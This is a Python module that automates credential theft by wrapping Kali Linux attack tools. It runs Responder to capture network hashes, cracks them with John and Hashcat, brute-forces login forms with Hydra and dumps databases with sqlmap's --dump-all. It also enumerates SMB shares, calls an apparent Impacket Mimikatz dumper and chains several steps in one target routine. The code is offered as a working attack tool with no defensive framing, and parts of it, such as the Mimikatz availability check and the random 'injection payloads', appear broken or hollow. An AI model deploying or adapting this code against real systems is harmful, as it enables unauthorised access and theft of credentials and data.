#!/usr/bin/env python3
"""
Advanced Credential Obtainer Module
Uses Kali Linux tools for comprehensive credential capture
"""

import subprocess
import os
import re
import json
import time
import threading
import random
import string
from datetime import datetime

class KaliCredentialObtainer:
    def __init__(self):
        self.tools_available = self.check_kali_tools()
        self.captured_credentials = []
        self.log_file = f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
    def check_kali_tools(self):
        """Check which Kali Linux tools are available"""
        tools = {}
        tool_list = [
            'ettercap', 'john', 'hashcat', 'nmap', 'hydra', 'medusa',
            'sqlmap', 'nikto', 'dirb', 'gobuster', 'wfuzz', 'crunch',
            'cewl', 'enum4linux', 'smbclient', 'smbmap', 'responder',
            'mitmproxy', 'arpspoof', 'dnsspoof', 'urlsnarf', 'dsniff',
            'msfconsole', 'impacket-smbserver', 'impacket-secretsdump'
        ]
        
        for tool in tool_list:
            try:
                result = subprocess.run(['which', tool], capture_output=True, text=True)
                tools[tool] = result.returncode == 0
            except:
                tools[tool] = False
        
        return tools
    
    def capture_via_responder(self, interface='eth0', duration=60):
        """Use Responder to capture network credentials"""
        if not self.tools_available.get('responder'):
            return "Responder not available"
        
        try:
            # Start Responder in analyze mode
            cmd = ['sudo', 'responder', '-I', interface, '-A', '-wrf']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Let it run for specified duration
            time.sleep(duration)
            process.terminate()
            
            # Parse Responder logs
            log_path = '/usr/share/responder/logs/'
            if os.path.exists(log_path):
                return f"Responder capture completed. Check {log_path}"
            
            return "Responder started - check logs manually"
            
        except Exception as e:
            return f"Responder error: {e}"
    
    def crack_with_john(self, hash_file, wordlist='/usr/share/wordlists/rockyou.txt'):
        """Use John the Ripper to crack passwords"""
        if not self.tools_available.get('john'):
            return "John not available"
        
        try:
            if not os.path.exists(wordlist):
                wordlist = '/usr/share/john/password.lst'
            
            cmd = ['john', '--wordlist=' + wordlist, hash_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Show cracked passwords
            show_cmd = ['john', '--show', hash_file]
            show_result = subprocess.run(show_cmd, capture_output=True, text=True)
            
            return show_result.stdout if show_result.returncode == 0 else result.stderr
            
        except subprocess.TimeoutExpired:
            return "John cracking timed out (5 minutes)"
        except Exception as e:
            return f"John error: {e}"
    
    def hash_crack_with_hashcat(self, hash_file, hash_type=0):
        """Use Hashcat to crack hashes"""
        if not self.tools_available.get('hashcat'):
            return "Hashcat not available"
        
        try:
            wordlist = '/usr/share/wordlists/rockyou.txt'
            if not os.path.exists(wordlist):
                return "RockYou wordlist not found"
            
            cmd = ['hashcat', '-m', str(hash_type), hash_file, wordlist, '-o', 'cracked.txt']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if os.path.exists('cracked.txt'):
                with open('cracked.txt', 'r') as f:
                    cracked = f.read()
                return cracked if cracked else "No passwords cracked yet"
            
            return result.stdout if result.returncode == 0 else result.stderr
            
        except subprocess.TimeoutExpired:
            return "Hashcat cracking timed out (5 minutes)"
        except Exception as e:
            return f"Hashcat error: {e}"
    
    def smb_enumeration(self, target):
        """Enumerate SMB shares and users"""
        if not self.tools_available.get('enum4linux'):
            return "Enum4linux not available"
        
        try:
            cmd = ['enum4linux', '-a', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            # Parse for credentials
            output = result.stdout
            users = re.findall(r'user:\[(.*?)\]', output)
            shares = re.findall(r'Mapping: (.*)', output)
            
            return {
                'users': users,
                'shares': shares,
                'full_output': output[:2000]  # First 2000 chars
            }
            
        except subprocess.TimeoutExpired:
            return "SMB enumeration timed out"
        except Exception as e:
            return f"SMB error: {e}"
    
    def web_brute_force(self, url, username_list=None, password_list=None):
        """Use Hydra for web form brute force"""
        if not self.tools_available.get('hydra'):
            return "Hydra not available"
        
        try:
            # Use default wordlists if not provided
            if not username_list:
                username_list = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not password_list:
                password_list = '/usr/share/wordlists/metasploit/unix_passwords.txt'
            
            # Basic HTTP POST form attack
            cmd = [
                'hydra', '-L', username_list, '-P', password_list,
                '-s', '80', url, 'http-post-form',
                '/login.php:username=^USER^&password=^PASS^:Login failed'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return result.stdout if result.returncode == 0 else result.stderr
            
        except subprocess.TimeoutExpired:
            return "Hydra brute force timed out"
        except Exception as e:
            return f"Hydra error: {e}"
    
    def sql_injection_scan(self, url):
        """Use SQLMap to find SQL injection vulnerabilities"""
        if not self.tools_available.get('sqlmap'):
            return "SQLMap not available"
        
        try:
            cmd = ['sqlmap', '-u', url, '--batch', '--risk=1', '--level=1', '--dump-all']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Look for database credentials in output
            output = result.stdout
            db_matches = re.findall(r'Database: (.*?)\n', output)
            table_matches = re.findall(r'Table: (.*?)\n', output)
            
            return {
                'databases': db_matches[:10],
                'tables': table_matches[:10],
                'full_output': output[:2000]
            }
            
        except subprocess.TimeoutExpired:
            return "SQLMap scan timed out"
        except Exception as e:
            return f"SQLMap error: {e}"
    
    def network_scan(self, target):
        """Use Nmap to scan target"""
        if not self.tools_available.get('nmap'):
            return "Nmap not available"
        
        try:
            cmd = ['nmap', '-sS', '-sV', '-O', '-p-', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse open ports
            ports = re.findall(r'(\d+)/(tcp|udp)\s+open\s+(.*?)\n', result.stdout)
            
            return {
                'open_ports': ports[:20],
                'full_output': result.stdout[:2000]
            }
            
        except subprocess.TimeoutExpired:
            return "Nmap scan timed out"
        except Exception as e:
            return f"Nmap error: {e}"
    
    def wordlist_attack(self, target_type, target_hash=None):
        """Generate wordlists and perform attacks"""
        if not self.tools_available.get('crunch'):
            return "Crunch not available"
        
        try:
            # Generate custom wordlist
            output_file = 'custom_wordlist.txt'
            
            if target_type == 'numeric':
                cmd = ['crunch', '4', '8', '0123456789', '-o', output_file]
            elif target_type == 'alpha':
                cmd = ['crunch', '4', '8', 'abcdefghijklmnopqrstuvwxyz', '-o', output_file]
            elif target_type == 'alphanumeric':
                cmd = ['crunch', '6', '10', 'abcdefghijklmnopqrstuvwxyz0123456789', '-o', output_file]
            else:
                cmd = ['crunch', '6', '8', '0123456789!@#$%^&*', '-o', output_file]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            word_count = 0
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    word_count = len(f.readlines())
            
            return f"Generated {word_count} passwords in {output_file}"
            
        except subprocess.TimeoutExpired:
            return "Wordlist generation timed out"
        except Exception as e:
            return f"Crunch error: {e}"
    
    def mimikatz_dump(self, target, username, password):
        """Use Impacket-Mimikatz to dump credentials"""
        if not self.tools_available.get('impacket-mimikatz'):
            return "Impacket-Mimikatz not available"
        
        try:
            cmd = ['impacket-mimikatz', target, username, password]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            # Parse for credentials
            output = result.stdout
            creds = re.findall(r'Username: (.*?)\n.*?Password: (.*?)\n', output, re.DOTALL)
            
            return {
                'credentials': creds,
                'full_output': output[:2000]
            }
            
        except subprocess.TimeoutExpired:
            return "Mimikatz dump timed out"
        except Exception as e:
            return f"Mimikatz error: {e}"
    
    def custom_credential_injection(self, target_url, username, password):
        """Generate credential injection payload"""
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        
        payloads = {
            'basic_auth': f'Basic {subprocess.run(["base64"], input=f"{username}:{password}".encode(), capture_output=True).stdout.decode().strip()}',
            'form_post': f'username={username}&password={password}&submit=Login',
            'json_auth': json.dumps({"username": username, "password": password}),
            'bearer_token': f'Bearer {self.generate_token()}',
            'cookie_session': f'session={self.generate_session_id()}; user={username}',
            'url_params': f'{target_url}?user={username}&pass={password}&auth={timestamp}'
        }
        
        return payloads
    
    def generate_token(self):
        """Generate random authentication token"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=32))
    
    def generate_session_id(self):
        """Generate random session ID"""
        chars = string.hexdigits
        return ''.join(random.choices(chars, k=24))
    
    def full_credential_obtain(self, target_info):
        """Complete credential obtaining process"""
        results = {}
        
        # 1. Network scan
        if 'ip' in target_info:
            results['network_scan'] = self.network_scan(target_info['ip'])
        
        # 2. Web vulnerability scan
        if 'url' in target_info:
            results['sql_injection'] = self.sql_injection_scan(target_info['url'])
        
        # 3. SMB enumeration
        if 'ip' in target_info:
            results['smb_enum'] = self.smb_enumeration(target_info['ip'])
        
        # 4. Generate wordlist
        results['wordlist'] = self.wordlist_attack('alphanumeric')
        
        # 5. Create credential injection payloads
        if 'url' in target_info:
            results['injection_payloads'] = self.custom_credential_injection(
                target_info['url'],
                f"admin_{datetime.now().strftime('%H%M')}",
                ''.join(random.choices(string.ascii_letters + string.digits + "!@#$", k=12))
            )
        
        return results

if __name__ == "__main__":
    obtainer = KaliCredentialObtainer()
    print("Kali Credential Obtainer Initialized")
    print("Available tools:", [k for k, v in obtainer.tools_available.items() if v])
